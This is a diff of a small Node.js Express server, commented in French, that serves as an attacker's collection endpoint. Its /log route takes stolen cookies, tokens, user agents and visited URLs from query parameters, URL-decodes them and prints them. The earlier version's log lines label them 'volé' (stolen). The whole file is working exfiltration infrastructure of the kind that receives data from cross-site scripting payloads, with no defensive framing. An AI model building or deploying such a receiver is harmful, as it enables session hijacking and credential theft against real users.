@@ -2,16 +2,19 @@ const express = require('express');
 const app = express();
 
 app.get('/log', (req, res) => {
-  
-  const query = req.query;
+  // Extraire les paramètres de la requête
+  const cookie = req.query.cookie || null;
+  const token = req.query.token || null;
+  const userAgent = req.query.userAgent || null;
+  const url = req.query.url || null;
 
-  if (query.token) {
-    console.log('[+] Token volé:', query.token);
-  } else if (query.cookie) {
-    console.log('[+] Cookie volé:', query.cookie);
-  } else {
-    console.log('[+] Données reçues:', req.url);
-  }
+  // Log clair des données reçues
+  console.log('--- Nouvelle connexion capturée ---');
+  if (cookie) console.log('[+] Cookie :', decodeURIComponent(cookie));
+  if (token) console.log('[+] Token :', decodeURIComponent(token));
+  if (userAgent) console.log('[+] User-Agent :', decodeURIComponent(userAgent));
+  if (url) console.log('[+] URL visitée :', decodeURIComponent(url));
+  console.log('----------------------------------\n');
 
   res.send('Données reçues, merci !');
 });
